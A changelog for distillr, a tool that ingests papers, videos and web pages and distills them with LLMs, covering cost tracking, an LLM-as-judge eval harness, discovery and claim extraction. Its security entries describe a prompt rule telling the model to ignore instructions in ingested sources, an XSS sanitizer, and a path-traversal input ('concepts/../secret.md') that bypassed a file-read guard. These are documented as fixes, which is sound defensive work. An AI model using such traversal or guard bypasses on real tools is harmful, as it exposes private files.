- The validation also confirmed the design works end-to-end: a local model scored *higher* on the deterministic dimensions (0.98 vs 0.92) but lost the pairwise judge (win-rate 0.00), so the recommendation correctly came back **`tentative`** - the confidence flag prevented a wrong switch to the weaker model. Tests added for graceful degradation, errored-anchor handling, and local-priced-at-zero.

## 0.9.7 - 2026-06-01

**`distill eval` rebuilt to a real release-gate standard.** Before spending money on model comparisons, the eval was hardened against the failure modes that make a cheap eval give an expensive-to-act-on wrong answer (grounded in the 2026 LLM-as-judge literature - position/verbosity/self-preference bias, statistical significance, pairwise > pointwise for gate decisions).

- **Pairwise, order-randomized judge.** Replaced the pointwise judge with a candidate-vs-**anchor** comparison run in **both A/B orderings** so position bias cancels; reports the candidate's win-rate. Reference-guided by construction (the anchor is the reference). When the judge shares the anchor's family the comparison is conservative (favors the anchor) and a caveat prints.
- **Decision is fully deterministic.** The composite is the deterministic dimensions only; the judge win-rate and per-fixture spread feed a **confidence flag** (`high` / `tentative`), never the pick. `--anchor` names the incumbent/reference (default `grok-4.3`).
- **Verbosity bias removed** from the depth dimension - full credit at a sane length, decay for padding, so a longer answer can't win on length.
- **Statistical honesty:** 3 fixtures per workload (was 1), per-model spread (min/max) reported, and a recommendation that goes `tentative` when the recommended model's worst fixture dips below the bar or the judge favors the anchor.
- **Observability:** `temperature=0` on analysis calls (reproducible), an append-only `.distill/eval/results.jsonl` (drift over time), and a **fixture-aware cost estimate** (the old one overshot real spend ~5-12× by pricing production-size tokens).

## 0.9.6 - 2026-06-01

**`distill eval` - cost × quality model selection with an advisory judge.** Models change fast and xAI's May-15 retirement left grok-4.3 as the cloud floor (no cheap fast tier), so the only way below it is a local model - and the only honest way to decide "is it good enough?" is to measure. `distill eval` sweeps candidate models over frozen golden fixtures and recommends the cheapest that clears your quality bar.

- **What it does:** runs each model over one fixture per analysis workload (paper / video / site) using the *real* analysis prompts, scores each output on deterministic dimensions (structure, depth, concept-coverage vs the golden, formatting) **plus an advisory LLM-judge** (faithfulness / depth / coverage), attaches real per-run cost from the pricing registry, and prints a cost × quality table with a recommendation. `--report` writes it to `.distill/eval/`.
- **Charter-safe by design** ([`docs/invariants.md`](../docs/invariants.md)): the judge is *advisory* - capped weight in the composite, **skipped for any candidate it equals** (no self-judging), and it never makes the call. The pass threshold and the recommended pick are deterministic. It **recommends**, never switches your model. Eval spend is cost-tracked + estimate-first; results cache by `(model, fixture, judge)` under `.distill/eval_cache/` so re-running after a model launch only runs new rows.
- New `distill/eval/` package (`scoring`, `judge`, `fixtures`, `harness`, `report`) and a `distill eval` command (`--workload`, `--models`, `--judge`, `--threshold`, `--report`, `--no-cache`, `--yes`). `analyze_paper` / `analyze_video` / `analyze_site_page` gained an optional `router_config` param (behavior-identical default) so the harness can run the real pipeline under a forced model.
- **Also corrects** the retired-model cost guidance from 0.9.5: the fast tiers redirect to grok-4.3 and bill at grok-4.3 rates, so there is no cheap cloud option - docs now point to `distill eval` + local models as the cheaper path.

## 0.9.5 - 2026-06-01

**Cost estimates and budget guardrails recalibrated to the actual default model.** The pricing *registry* (`distill/llm/cost.py`) was already correct and current (verified against June-2026 rates: grok-4.3 $1.25/$2.50, grok-4.20 $2/$6, gemini-3.1-pro $2/$12, gemini-3.5-flash $1.50/$9, Deep Research ~$2.50/$5), but the cost *estimates* still used the retired `grok-4-1-fast` rate (~$0.006/video) while `config.py` defaults every workload to `grok-4.3` (~$0.03/video). So pre-run estimates - including the `--max-run-cost` / `--monthly-budget` projections - under-counted real spend ~5×, and the budget guard fired too late.

- **Estimates now derive from the pricing registry, not hard-coded dollars.** New `_STAGE_TOKENS` + `estimate_stage_cost(stage)` in `distill/pipeline/costs.py` compute each stage's cost from representative token volumes × the current default model's pricing, so the estimate tracks the model and can never silently drift again. Rewired `estimate_run_cost`, `estimate_discover_cost` defaults, `estimate_topic_watch_cost` / `estimated_topic_watch_sweep` (the budget-guard projection), and `display_estimate`.
- **Net effect:** budget projections are now accurate on grok-4.3 (a 10-video watch projects ~$0.31 + report, not ~$0.06 + report), so `--max-run-cost` and `--monthly-budget` actually protect. The 0.9.1 self-calibrating estimator still overrides these with measured rates once a topic has history; these are the model-accurate cold-start fallback.
- **Docs:** `cost.md` per-stage table, example runs, and budget guidance recomputed at grok-4.3; README cost section and sample-run figure corrected (the $1.01 sample was grok-4.20 pricing; at the grok-4.3 default the same run is ~$0.58). The retired fast tier remains selectable via `XAI_FAST_MODEL` for users who want bulk-cheap over fidelity.

## 0.9.4 - 2026-06-01

**`--rigor` across `discover` / `papers` / `latest`, on calibrated thresholds.** The quality-bar knob that only `discover` had now works on the single-source commands too - drops reranked candidates below a `final_score` floor before the per-source limit. This completes the 0.9 discovery-loop close-out.

- **Calibrated per command, not copy-pasted.** The three rerank prompts score on different criteria, so the thresholds differ: discover (cross-source goal-fit gate) 0.70/0.50/0.30; papers 0.65/0.45/0.30; latest 0.60/0.40/0.25. The calibration is grounded in a documented case - discover rated 0/33 videos worth ingesting on a topic where `latest` surfaced 5 strong picks - and the rationale (curation gate vs. single-source relevance ranker) is written up in `docs/architecture.md` ("Rigor calibration"). New `PAPER_RIGOR_THRESHOLDS` / `VIDEO_RIGOR_THRESHOLDS` + `source_rigor_threshold(source, rigor)` in `distill/pipeline/discovery.py`.
- **Opt-out, never surprising.** On `papers` / `latest` the default is `off` (keep the rerank's top picks exactly as before); the bar engages only when you ask for `strict`/`balanced`/`loose`. `discover` keeps its `balanced` default (unchanged since 0.8.12).
- **Honest about scope.** Rigor scores on the *LLM rerank*, so under `--no-rerank` (or chronological `--top-by-date`) an explicit bar is skipped with a warning rather than applied to heuristic scores on a different scale. When a bar is applied, a `kept X/Y` line shows what it dropped. `papers`/`latest` rerank the full candidate pool before the limit when a bar is set, so the threshold has something to cut.

## 0.9.3 - 2026-06-01

**Preview-as-default sizing on fresh topics.** `distill discover "<goal>" --topic <new>` no longer auto-applies a fixed `--rigor` bar and ingests; on a topic with no artifacts yet it now shows the reranked candidates and a **size-then-approve menu** - "Excellent / Including good / Everything worthwhile" - each line carrying its source breakdown and its own 0.9.1 spend estimate, so you choose the depth against the real quality cliff and the real cost before committing. This is the preview-as-primary-flow the roadmap (section 12) was built around.

- New pure `build_sizing_options` + `SizingOption` in `distill/pipeline/discovery.py`: derives a nested ladder from the score cliff (`detect_score_cliff`) and the balanced/loose rigor thresholds, caps each cut by the per-source limits, de-duplicates cuts that resolve to the same set, and attaches a per-option `CostEstimate`. Fully tested, no IO.
- The chosen set is saved to the 0.9.2 preview cache and its id printed, so any selection is re-runnable verbatim with `--from-preview`.
- **Behavior is opt-out, never surprising.** `--yes` keeps the non-interactive path (rigor filter + auto-ingest); `--preview` and `--from-preview` are unchanged. Topics that already have artifacts keep the single-confirm flow unless you pass the new `--size` flag to force the menu.

## 0.9.2 - 2026-06-01

**Commit-by-id preview replay (`discover --from-preview <id>`).** The discover rerank is a judgment call, so the set you previewed could differ from the set a real run ingests. Now `discover --preview` saves the exact goal-ranked shortlist and prints an id; `discover --from-preview <id> --topic <t>` replays that set verbatim - skipping query-generation and the rerank entirely - so you commit to precisely what you saw. temperature=0 (0.8.12) makes a re-rank reproducible; replay guarantees it. Closes the cached-commit-by-id follow-on left open by 0.8.12 / 0.9.0.

- New `distill/pipeline/preview_cache.py` (pure functions, injected `now_iso`): `save_preview` writes `library/.preview_cache/<id>.json` under a **content-addressed** id (a hash of goal + model + rigor + member identifiers, so the same selection always gets the same id); `load_preview` faithfully reconstructs each `PaperRecord` / `VideoInfo` / `SiteSeed` so replay ingests identically. Unknown / malformed / corrupt ids raise `PreviewCacheError` with an actionable message - never a silent failure.
- The discover ingest path was extracted into a shared `_discover_ingest_set` helper (plus focused per-source sub-helpers), so the live flow and `--from-preview` replay ingest through one code path. `--from-preview` is mutually exclusive with `--from-gaps` / `--preview`.
- MCP parity is tracked separately: the MCP `discover` tool already returns candidates without ingesting (a preview by nature) and now carries the 0.9.1 `cost_estimate`; a dedicated replay arg follows when the MCP tool gains an ingest path.

## 0.9.1 - 2026-06-01

**Metadata-aware, self-calibrating discover cost estimate.** The pre-run spend line under a `discover` preview was a flat `count x constant`; it now reads free candidate metadata and calibrates against real history, and reports a range instead of a single point.

- **Per-video duration scaling.** Transcript-analysis cost tracks runtime, so each candidate video's share now scales linearly around a nominal 15-minute average (clamped 0.3x..4x); unknown duration assumes nominal. Papers keep a flat per-item rate (PDF page count is not fetched at discovery - it would need a network call), as do site seeds.
- **Self-calibrating rates.** `load_cost_calibration(log_dir)` derives per-paper / per-video / per-site USD rates from *clean single-source* runs in `cost_log.jsonl` (a paper-only run prices papers, etc.), so a mixed `discover` run never cross-contaminates a rate. `_preview` rows are skipped and a source type with fewer than 3 ingested items keeps its default constant. The rates improve as history accrues.
- **Honest range.** The estimate now prints `~$0.42 (est; $0.29-$0.63)` - an asymmetric band (overruns are more common than underruns) that widens to 0.5x..2.0x when no calibration exists yet and narrows to 0.7x..1.5x once it does.
- New `CostCalibration` / `CostEstimate` dataclasses, `load_cost_calibration`, and `estimate_discover_items` in `distill/pipeline/costs.py`; the count-based `estimate_discover_cost` stays (now calibration-aware) for simple callers. The MCP `discover` tool gains a `cost_estimate` field for parity. Closes the duration/length-aware calibration follow-on left open by 0.8.12 / 0.9.0.

## 0.9.0 - 2026-05-30

**Two-pass synthesis with a structured claim intermediate (opt-in).** The headline of the 0.9 milestone: synthesis can now run over an extracted *claim set* instead of re-reading every insight into one prompt.

- **New `distill/claims/` layer**, structured exactly like the 0.8 `distill/concepts/` playbook layer (frozen `Claim` records, a `ClaimRole` StrEnum - background / method / result / limitation / conclusion, LLM-produces-rows / Python-parses-rows split, deterministic JSONL round-trip).
  - Pass 1 - `run_claims(topic, ...)` walks every `_Insights.md`, extracts atomic claims (one cheap LLM call per not-yet-seen source, tagged `claims_extract` for separate cost tracking), and appends them to an append-only `<topic>/.claims/claims.jsonl`. Already-extracted sources are skipped, so refresh is cheap.
  - Each claim carries an optional subject/predicate/object triple, optional dataset/metric, an `evidence_type`, and a `role_confidence` score. The extractor chooses granularity per claim; low-confidence role tags are surfaced downstream rather than dropped. Claim ids are content-addressed (`source_id` + normalized-text hash) so re-extraction is stable and downstream scoring can cache by id.
  - Pass 2 - a new `claim_synthesis_prompt` clusters claims by what they assert, names contradictions between sources explicitly, cites every statement back to specific claim handles (`[C7]`), and flags low-confidence / single-source claims as the corpus's soft spots.
- **Opt-in wiring.** `distill resynthesize <topic> --two-pass` and the MCP `synthesize` tool's `two_pass` arg route the corpus synthesis through the claim set. Single-pass synthesis remains the default; two-pass falls back to single-pass when a topic has no extractable claims, so the flag never silently produces an empty synthesis.
- **Shared insight discovery.** The `_Insights.md` walk (`discover_insights` / `derive_source_id`) was lifted to a foundational `distill/library/insights.py` so the concept and claim layers share one implementation; a new import-linter contract keeps both knowledge layers below commands/mcp/web/ingestors.

Deferred to 1.0 (noted in the roadmap, not built here): per-claim fitness caching by `(claim_id, evaluator_id)`, the golden-eval gate that validates two-pass and flips the default, and metamorphic robustness checks.

## 0.8.12 - 2026-05-30

**Discovery-loop UX.** Makes `distill discover` a confident size-then-approve loop.

- **`--rigor strict|balanced|loose`** drops reranked candidates below a goal-fit threshold (0.7 / 0.5 / 0.3) before the per-source limits, so the shortlist reflects the quality bar you ask for.
- **Score-cliff sizing** - the shortlist now reports how many top items sit above the largest rerank-score drop (the "clearly-excellent" set), so you can size the ingest against the natural cliff.
- **Pre-run cost estimate** - a free-metadata estimate (`estimate_discover_cost`, count-based per source type) is shown before you commit, no extra network fetches.
- **Deterministic rerank** - the discover rerank LLM call now runs at `temperature=0`, so the previewed order is reproducible.

Continues the 0.9.0 milestone. (The preview-flow-as-default rework and a cached shortlist for exact replay remain follow-ons.)

## 0.8.11 - 2026-05-30

**Gap-driven discovery (`discover --from-gaps`).** The inverse of goal-driven discovery: instead of starting from a user-written goal, `distill discover --from-gaps --topic <t>` reads the topic's coverage gaps (thin source types, missing syntheses, stale recency) and synthesizes a discovery goal from them, then runs the normal query-generation -> rerank -> preview/approve -> ingest flow. "You're single-source on X, missing a corpus synthesis" becomes "find recent sources that fill those gaps." The gap computation was lifted from the MCP server into a shared `distill/pipeline/gaps.py` so the `research_gaps` MCP tool and the discover command share one implementation (no `commands -> mcp` coupling). Continues the 0.9.0 milestone.

## 0.8.10 - 2026-05-30

**Synthesis register styles (`--style`).** `distill resynthesize --style exec|pop|landscape|disagreements-only` selects an emphasis register for the human-read topic and corpus syntheses, while every style still honors the PhD-level contract (cross-source claims, named disagreements, shared blind spots). `exec` leads with the decision; `pop` is an accessible explainer; `landscape` surveys the field's shape; `disagreements-only` foregrounds conflicts. Default (no `--style`) is unchanged. Prompt-layer only via a new `STYLE_GUIDANCE` map; the MCP `synthesize` tool gains a matching `style` argument. Continues the 0.9.0 milestone.

## 0.8.9 - 2026-05-30

**Local-file ingest (`distill ingest <path>`).** `distill ingest` now accepts a local file path in addition to a URL: a PDF, Markdown file, plain-text file, or saved/clipped HTML article is extracted and routed through the same analysis pipeline the network sources use, emitting a raw `_Content.md` plus an `_Insights.md` (full provenance, cost-tracked) under `library/topics/<topic>/local/<slug>/`. PDFs use the paper-analysis prompt; Markdown / text / HTML use the page-analysis prompt (both carry the 0.8.7 untrusted-content guard). Closes the gap where the playbook layer only updated from network ingestion. Continues the 0.9.0 milestone.

- New `distill/ingestors/local/extract.py` (text extraction: pypdf for PDFs, a stdlib HTML-to-text pass that drops script/style, surrogate sanitization, a 100K-char cap) and `distill/pipeline/analysis/local.py` (orchestration). The command dispatches to the local pipeline when the target exists on disk, otherwise treats it as a URL.

## 0.8.8 - 2026-05-30

**Anti-AI-slop register guard (first 0.9.0 increment).** Adds a shared `REGISTER_RULES` constant (`prompts/shared.py`) and threads it into the human-read outputs: topic and corpus synthesis, the report section writer, and the topic brief. It bans filler superlatives, empty scaffolding ("it's worth noting", "delve into", "in conclusion"), hedge-stacking, and the "not only X but also Y" tic, grounded in the Wikipedia "signs of AI writing" list. Anti-hallucination keeps the corpus correct; this keeps the prose publishable. Prompt-layer only, no new dependency. Begins the 0.9.0 synthesis-depth milestone; the structured extraction prompts are deliberately left untouched (their output is data, not prose).

## 0.8.7 - 2026-05-30

**Security hardening.** Closes the two genuinely-relevant security gaps for an API-consumer tool that ingests untrusted public sources. (The broader "AI security" surface - model poisoning, extraction, inversion, DP, enclaves - is out of scope by architecture: distillr trains and serves no models. See the new "Security posture" section in [`ROADMAP.md`](../ROADMAP.md#security-posture).)

- **Indirect prompt-injection resistance.** Every analyzed source (transcript, page, PDF, tweet) is untrusted text that could embed instructions to hijack the analysis. A shared `UNTRUSTED_CONTENT_RULES` constant is now threaded into every per-source analysis prompt (video / shorts / scan / site page / paper / tweet): the source is labelled untrusted data and the model is told to ignore any instructions inside it. Prevention to pair with the planned 0.10 run-time verify hook (detection).
- **Web-dashboard XSS fixed.** The local dashboard rendered artifacts through `markdown(...)` with raw HTML passed through, a stored-XSS vector for untrusted-derived content. Rendered HTML now goes through an `nh3` allowlist sanitizer (strips `<script>`, event handlers, `javascript:` URLs; preserves formatting and tables). Adds `nh3` to dependencies.

## 0.8.6 - 2026-05-30

**Cost-tracking completeness.** Closes an off-ledger spend gap and makes the expensive operation (Deep Research) price accurately, so `distill costs` reflects real spend.

- **Audio transcription is now on the ledger.** Cloud speech-to-text (xAI Grok STT ~$0.10/hr, OpenAI Whisper ~$0.36/hr) was previously unrecorded; it is now tracked per call via `CostTracker.record_transcription(provider, duration_s)`, priced from a new per-hour `TRANSCRIPTION_PRICING` table. Local faster-whisper resolves to $0. Recorded at the X/tweet ingest using the source's known video duration.
- **Deep Research cost is model-aware.** `record_gemini_query(model)` now prices each query by model, so **Deep Research Max** (`deep-research-max-preview-04-2026`, ~$5/query) is no longer undercounted at the standard ~$2.50 rate. Count-only trackers (sub-range report copies) keep the standard estimate.
- `total_cost` and the run summary now include transcription spend; `summary_dict` surfaces `transcription_calls` / `estimated_transcription_cost` when present.
- **Audit result:** all LLM text-generation call sites and Gemini Deep Research were already tracked; transcription was the one gap and is now closed. Model selection remains tier-based and defaults to the cost-efficient `grok-4.3`.

## 0.8.5 - 2026-05-30

**Model refresh (Gemini).** Brings distillr's Google model references up to the May 2026 lineup. No xAI change: the `grok-4.3` default is the current flagship and stays.

- **Gemini Deep Research** (the report / research-brief engine) bumped from the superseded `deep-research-pro-preview-12-2025` to its April-2026 successor **`deep-research-preview-04-2026`** across the accordion, brief, and deep-research pipelines. The pricier `deep-research-max-preview-04-2026` is recognized for cost-tracking but not used by default.
- **`gemini-3.5-flash`** (GA 2026-05-19, $1.50 / $9.00 per 1M, 1M context) added to the pricing and context-window tables so it is cost-tracked and selectable as a Gemini-provider model.
- **`distill doctor`** Gemini connectivity check updated from the older `gemini-2.5-flash` to `gemini-3.5-flash`.
- Retired/superseded model IDs (the old Deep Research preview, the May-15-retired Grok IDs) are retained in the pricing table for historical cost computation; the router continues to alias retired Grok IDs forward to `grok-4.3`.

## 0.8.4 - 2026-05-30

**Agent-discoverable library.** Auto-generated `CLAUDE.md` orientation files so coding agents that auto-load them (Claude Code, Cursor, Codex CLI, others) get immediate context when they `cd` into the library or a topic, without needing the MCP server.

### What's new

- **Per-topic `library/topics/<topic>/CLAUDE.md`** - one-line summary (topic-synthesis lede), source counts (papers / videos / pages), a wikilink to the topic synthesis, "Ask me about" example queries from the corpus's named entities and concepts, and the read-surface MCP tool listing.
- **Library-root `library/CLAUDE.md`** - an index of every topic with one-line summaries and source counts.
- **Automatic regeneration** on every topic refresh: the synthesis writers (`synthesize_topic` / `synthesize_corpus`) regenerate the affected topic's file and the library index, best-effort so a failure never fails a synthesis.
- **`distill claude-md [<topic>] [--all]`** - manual regeneration / backfill for existing topics.

### Design notes

- All generation logic is pure functions in `distill/library/claude_md.py` (foundational layer): reads existing artifacts and the `concepts.jsonl` / `entities.jsonl` rollups as raw JSON (no `distill.concepts` import), injects `now_iso` for deterministic tests. `CLAUDE.md` is plain Markdown with no frontmatter. No new LLM calls, no new dependencies, no cost.

### Tests

`tests/unit/library/test_claude_md.py` (source counting, lede extraction, top concepts/entities, rendering, atomic write, library index, empty-topic skip) plus `tests/unit/commands/test_claude_md.py` for the CLI command.

## 0.8.3 - 2026-05-30

**Reproducible toolchain and engineering baseline.** A no-business-logic release that makes the build harness deterministic and self-enforcing. Motivated directly by 0.8.2, which shipped clean code yet broke CI when an unpinned `typer>=0.9.0` floated to typer 0.26 (it now vendors its own `click`, so `typer.Exit` stopped being `click.exceptions.Exit`). distillr had no lockfile, so every CI run re-resolved the whole dependency tree against the latest release of everything. This release closes that gap.

### What's new

- **`uv` as the sole toolchain.** Migrated from pip + setuptools to `uv`: a committed `uv.lock`, `uv sync --frozen` in CI for deterministic environments, `build-backend = "uv_build"`, and `[dependency-groups]` dev tooling replacing the `.[dev]` extra. The editable-install workflow is preserved (`uv sync` / `uv run`).
- **Python 3.12-3.14 support matrix.** Floor raised from 3.10 (EOL Oct 2026) to `requires-python = ">=3.12"`; classifiers updated; CI runs `[3.12, 3.13, 3.14]`; ruff and Pyright target 3.12. Deliberately not 3.14-only - distillr is a published library.
- **Automated dependency update config**: weekly grouped patch/minor updates with majors flagged; every bump runs full CI against the lock before merge. *(Later removed - dependency/action bumps are reviewed manually; automated dependency update bots are deliberately not used.)*
- **Contracts now enforced in CI.** `import-linter` (dependency-direction layer contracts, previously configured but never run) and `pip-audit` are blocking lanes; `xfail_strict` and `--strict-markers` are on.
- **Branch coverage.** Coverage switched from line to branch metric, gated at the measured baseline (floor 79) and ratcheted up-only toward the 1.0 target of 95.
- **`pre-commit` identical to CI.** Lint/type/security/test hooks run via `uv run --frozen` (the exact locked versions CI uses); Pyright and import-linter added; full pytest on the pre-push stage.
- **Supply chain.** A CycloneDX SBOM ships as a build artifact, and PyPI publishing emits PEP 740 build-provenance attestations over the existing OIDC trusted-publishing channel.

### Incidental modernizations

The `py312` target surfaced two `(str, Enum)` enums (now `StrEnum`) and one generic function (now PEP 695 type-parameter syntax). Behavior-identical, verified by the suite.

### Verification

Full suite green across the 3.12 / 3.13 / 3.14 matrix (1633 tests each); ruff, ruff-format, Pyright (`distill/llm/`), import-linter (3/3 contracts), pip-audit, and `uv build` (wheel confirmed to bundle `distill/web` templates + static assets) all pass.

## 0.8.2 - 2026-05-29

**Playbook recovery surface.** 0.8 wrote `.history/<slug>/<iso-timestamp>.md` snapshots on every concept-note overwrite, but nothing could read or restore them - snapshot-without-recovery. This release adds the read and restore surface over data 0.8 already produces (no new LLM calls, no new dependencies).

### What's new

- **`distill concepts` is now a command group.** Extraction moved from `distill concepts <topic>` to **`distill concepts build <topic>`** so the group can host the recovery subcommands. (Pre-1.0 interface change; flags are otherwise identical.)
- **`distill concepts log <topic> <slug>`** - list a note's history snapshots, newest first, each annotated with a one-line summary of what changed at that step (sources added/removed, evidence-interval shifts, contested flips).
- **`distill concepts diff <topic> <slug> [ts_a] [ts_b]`** - diff a note across versions. No timestamps: most recent snapshot vs the live note. One timestamp: that snapshot vs live. Two: snapshot vs snapshot. Frontmatter changes surface as a structured delta (which evidence rows joined/left, how each interval bound moved, contested/scalar shifts); the body diffs as text.
- **`distill concepts rollback <topic> <slug> <timestamp>`** - atomically restore a prior snapshot. The current version is snapshot into `.history` first (so rollback is itself reversible), the chosen snapshot becomes the live note, and the matching `concepts.jsonl` / `entities.jsonl` rollup row is rebuilt from the restored note's frontmatter. `--yes` skips the confirmation prompt.
- **MCP companion tools** - `concept_history(topic, slug)` and `concept_diff(topic, slug, ts_a, ts_b)` expose the same read surface to agents, mirroring the existing `find_concepts` / `read_concept` shape.

### Design notes

- Rollback **reconstructs, never recomputes**: it restores the note and its rollup row from the snapshot's own frontmatter rather than re-running the merge, because `mentions.jsonl` is append-only and re-merging would reproduce the current state, not the requested snapshot.
- All recovery logic lives in pure functions in `distill/concepts/recovery.py` (filesystem IO only, injected `now_iso` for deterministic tests); the CLI and MCP layers are thin presentation over it.

### Tests

`tests/unit/concepts/test_recovery.py` (timestamp round-trips, snapshot enumeration/resolution, typed frontmatter parsing, structured diff, transition summaries, rollback incl. rollup rewrite / reversible backup / no-op / deleted-note recreation) plus CLI and MCP tests for the three commands and two tools. Overall coverage ≥80%.

## 0.8.1 - 2026-05-16

**Frontmatter rename.** The synthesis emitters wrote a `confidence:` field whose values (`single-paper`, `corpus-consensus`, `interpretation`, …) were always scope/routing labels, never calibrated confidence numbers. Renamed to `synthesis_scope:` so downstream consumers (Obsidian Dataview queries, MCP agents, custom scripts) don't mis-interpret the routing label as a numeric grade.

### What's new

- **`synthesis_scope:` everywhere** - `distill/library/paths.py::base_frontmatter` now writes `synthesis_scope:` instead of `confidence:`. Every emitter (per-paper insights, per-video insights, per-page insights, channel/topic/corpus synthesis, paper synthesis, site synthesis, accordion/briefing/deep-research reports, watch alerts, topic diffs, topic trends) updated to pass `synthesis_scope=…` instead of `confidence=…`.
- **`distill doctor --migrate-frontmatter [--apply]`** - one-shot migration over existing artifacts. Dry-run by default, lists each file that needs rewriting and the value being migrated. `--apply` executes the rewrite in place. Mirrors the `--migrate-links` pattern from 0.7. Idempotent: re-running on an already-migrated corpus is a no-op. Drops orphaned `confidence:` lines if a file ended up with both fields from a partial prior run.

### Migration

```bash
distill doctor --migrate-frontmatter            # dry-run, shows what would change
distill doctor --migrate-frontmatter --apply    # execute the rewrite
```

The migration scans `library/**/*.md` excluding hidden directories (`.history/`, `.distill/`, `.concepts/`) so versioned snapshots and operational artifacts stay untouched. New artifacts written after this release already use `synthesis_scope:` - the migration is only for pre-0.8.1 corpora.

### Tests

Eight new tests across the migration surface (scan/apply/idempotent/dropped-orphan-field/format-preservation). Coverage still ≥80%.

### Also fixed

- **`canonicalize` idempotency.** Hypothesis caught `canonicalize("000ss") == "000s"` but `canonicalize("000s") == "000"` - the plural-stripping regex `(\w{3})s\b` matched the inner three chars + terminal `s`, leaving the result still ending in `s` to be stripped again on a second pass. Tightened to `(\w{2}[^\Ws])s\b` so the char preceding the terminal `s` must itself be a non-`s` word char. Preserves `-ss` endings (`address`, `pass`, `less`) and short acronyms (`css`, `ml`). Failing example pinned via `@example(s="000ss")`.
- **Property-test HealthCheck flakes under coverage.** `tests/unit/library/test_paths_props.py`, `test_wikilinks_props.py`, `test_frontmatter_props.py`, `tests/unit/llm/providers/test_agent.py`, and one test in `tests/unit/llm/test_router.py` were hitting `HealthCheck.too_slow` (and occasionally `filter_too_much`) under `pytest --cov`'s tracing overhead. Strategies that map through `slugify_title` or that filter heavily via `assume()` are slow enough under instrumentation to exceed hypothesis's 2-second input-generation budget. Suppressed the relevant health checks. Tests still run at `max_examples=100`; the property semantics are unchanged.

### Out of scope (scope choice)

The per-source `Insights.md` values (`single-source`, `single-paper`, `source-content`) are also renamed, not just the cross-source synthesis values. The roadmap entry listed "synthesis emitters" but the rationale ("the field is a routing label, not a number") applies uniformly - partial renames would leave the same misnomer in the per-source files. Consistent rename now is cheaper than two migrations.

## 0.8.0.3 - 2026-05-16

Follow-up hardening on top of 0.8.0.2. Two bugs fixed, one stale annotation cleaned up.

### Security

- **`read_concept` absolute-path-parts bypass (medium).** 0.8.0.2 replaced the substring-based concept/entity guard with a check on `full_path.parts` - but `full_path` is the *absolute* resolved path, so its parts include ancestors outside `library_dir`. A user with `DISTILL_OUTPUT_DIR` configured under a directory named `concepts` or `entities` (e.g. `/home/alice/concepts/library`) satisfied the guard for every file in the library, letting an MCP caller read non-playbook artifacts (synthesis output, `.distill/tasks/` task artifacts, etc.). Fix: enforce the layout on the *library-relative* path - require exactly `topics/<topic>/(concepts|entities)/<file>.md` - instead of inspecting absolute parts. Regression tests cover library directories under `concepts` and `entities` ancestors, plus shape edge cases (history-snapshot paths, non-`.md` sidecars, top-level files).

### Correctness

- **Search artifact-type misclassification under ancestor-named library paths.** `pipeline/search.py::_detect_artifact_type` walked `path.parts` of the absolute path when classifying artifacts as `paper` vs `insights` for ranking. A library configured under a `papers/` or `sites/` ancestor would mis-label every artifact. Today the score table doesn't weight those types differently, so the user-visible effect is bounded to the `artifact_type` field, but the bug is the same class as the `read_concept` issue and would become a ranking-skew bug if `_TYPE_BOOST` is extended. Fix: classify against the library-relative path. Regression test pins the behavior.

### Docs

- **ROADMAP package-layout annotations.** `# 0.8 - local-file ingest` / `# 0.8 - local-file routing` corrected to `# 0.9` to match the milestone description (the entry was moved from 0.8 to 0.9 in an earlier edit but the inline `#` comments were missed).

No public API breaks. Existing 0.8.0.2 regression tests still pass; three new tests across the touched layers.

## 0.8.0.2 - 2026-05-16

Security + correctness hardening over 0.8.0/0.8.0.1. Four bugs fixed from a post-release scan:

### Security

- **`read_concept` path-bypass (medium).** The concept/entity restriction in the MCP `read_concept` tool did a substring check on the *unnormalized* input path, so an input like `topics/tkg/concepts/../secret.md` passed the guard while resolving to a non-concept file inside `library_dir`. Library-root containment still held (no OS-wide file read), but the tool's narrower contract was bypassable, exposing private corpus files or `.distill/` task artifacts. Fix: check the *resolved* path's directory parts for a `concepts` or `entities` segment, not the raw input string. Regression tests cover `concepts/../secret.md` and `.distill` traversal.

### Correctness

- **Concept slug collisions overwriting playbooks.** `MergedConcept.slug` is intentionally lossy (`"a b"`, `"a/b"`, `"a-b"` all collapse to `"a_b"`), but the writer assumed any existing file at `<slug>.md` belonged to the same concept and overwrote it. Fix: writer reads the existing note's `normalized_name` from frontmatter; if identities differ, suffix-bumps to `<slug>__2.md`. Idempotent self-rewrites still hit the same file. Added `normalized_name` to playbook frontmatter as the authoritative identity field.
- **Order-dependent same-source aggregation.** When extraction produced duplicate mentions for `(source_id, canonical_name)`, the normalize layer's representative selection for `claim_excerpt`, `evidence_type`, `artifact_path`, and `normalized_name` depended on input order - the commutativity property tests didn't catch it because they only compared `source_id` sets and evidence counts. Fix: every selected field now uses an order-independent rule (longest claim, lex-min path, majority-vote kind, etc.); the property tests were strengthened to vary those fields and check the full SourceEvidence set.
- **`distill latest --concepts` token usage was untracked.** `papers` and `site-batch` already threaded their `CostTracker` into the concept-extraction hook, but `latest` couldn't because the learning workflow owns its tracker internally and never returned it. Fix: added an optional `post_ingest_callback` parameter to `run_learning_command` / `process_learning_selection`; `latest_cmd` now passes a callback that runs concepts against the same tracker the rest of the run uses. Concept spend now flows into `cost_log.jsonl` with the rest of the run.

No public API breaks. Six new tests across the touched layers, total 1474 tests pass.

## 0.8.0.1 - 2026-05-15

Build-config fix. **0.8.0 on PyPI was broken**: the explicit `[tool.setuptools] packages` allowlist in `pyproject.toml` was missing the new `distill.concepts`, `distill.doctor`, and `distill.cli_support` subpackages, so the published wheel was missing those packages and every CLI path that touched them (`distill concepts`, `distill doctor`, the local-inference recommendations in doctor output) crashed with `ModuleNotFoundError` on a fresh install. Caught during a post-release validation install.

- Switch from explicit packages allowlist to `[tool.setuptools.packages.find]` with `include = ["distill*"]`. New subpackages now auto-discovered; the class of bug is eliminated.
- Verified the 0.8.0.1 wheel bundles `distill/concepts/`, `distill/doctor/`, and `distill/cli_support/` before publishing.

No source code or behavior changes -- this is a packaging-only patch.

## 0.8.0 - 2026-05-15

**Concept playbook.** Per-topic concept and entity notes that accumulate evidence across the corpus. When the 21st paper on a topic mentions a technique, distillr strengthens what it knows about that technique instead of just appending another insight file. This is the qualitative shift the roadmap has been pointing at: distillr stops being a batch processor and starts maintaining a knowledge base.

### What's new

- **New subpackage `distill/concepts/`.** Per-insight LLM extraction (one call per `_Insights.md`), append-only `mentions.jsonl` audit log, pure-Python deterministic merge, ACE-style itemized playbook notes at `library/topics/<topic>/concepts/<slug>.md` and `library/topics/<topic>/entities/<slug>.md`, JSONL rollups at `concepts.jsonl` / `entities.jsonl`.
